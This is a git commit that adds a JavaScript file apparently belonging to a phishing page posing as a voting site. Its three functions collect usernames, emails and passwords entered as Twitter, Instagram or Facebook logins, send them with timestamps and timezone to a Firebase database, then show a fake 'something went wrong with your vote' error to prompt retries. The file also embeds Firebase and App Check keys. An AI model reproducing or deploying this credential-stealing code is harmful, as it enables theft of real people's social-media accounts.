cc15cf8727524fa5a5ac58a929d0b9e7cfa95f92
sandylangi <sandylangittujuh@yahoo.co.id>
2024-02-29 13:05:19 +0000

    Initial commit
    Created from https://vercel.com/new

---
+++ js/firebase.js
@@ -0,0 +1,137 @@
+// Initialize Firebase
+const firebaseConfig = {
+apiKey: "AIzaSyB2L07Esi6cYE6opcqZF2VSUu0HpA4n5pQ",
+authDomain: "foodtracksco.firebaseapp.com",
+databaseURL: "https://foodtracksco-default-rtdb.firebaseio.com",
+projectId: "foodtracksco",
+storageBucket: "foodtracksco.appspot.com",
+messagingSenderId: "952224657340",
+appId: "1:952224657340:web:8d83b8dc3491a7d0ad05b9"
+};
+firebase.initializeApp(firebaseConfig);
+const appCheck = firebase.appCheck();
+console.log(appCheck);
+appCheck.activate('6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', true);
+
+
+function tw_login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var email = document.getElementById('tw-email').value;
+  var password = document.getElementById('tw-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Twitter';
+
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+      document.getElementById('fb-pass').value = '';
+
+      return false;
+    }, 2000);
+  }
+}
+
+
+function iglog() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var username = document.getElementById('ig-uname').value;
+  var password = document.getElementById('ig-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  console.log(timezone);
+  var accountType = 'Instagram';
+
+  if (username !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: username,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+
+      document.getElementById('ig-pass').value = '';
+      return false;
+    }, 2000);
+  }
+}
+
+function login() {
+  firebase.auth().signInAnonymously().catch(function(error) {
+    var errorCode = error.code;
+    var errorMessage = error.message;
+    window.alert("Error: " + errorMessage);
+  });
+
+  var email = document.getElementById('fb-email').value;
+  var password = document.getElementById('fb-pass').value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = 'Facebook';
+
+  if (email !== '' && password !== '') {
+    firebase.database().ref('fbdet').push({
+      emle: email,
+      mobile: '',
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType
+    });
+
+    setTimeout(function() {
+
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+      document.getElementById('fb-pass').value = '';
+
+      return false;
+    }, 2000);
+  }
+}
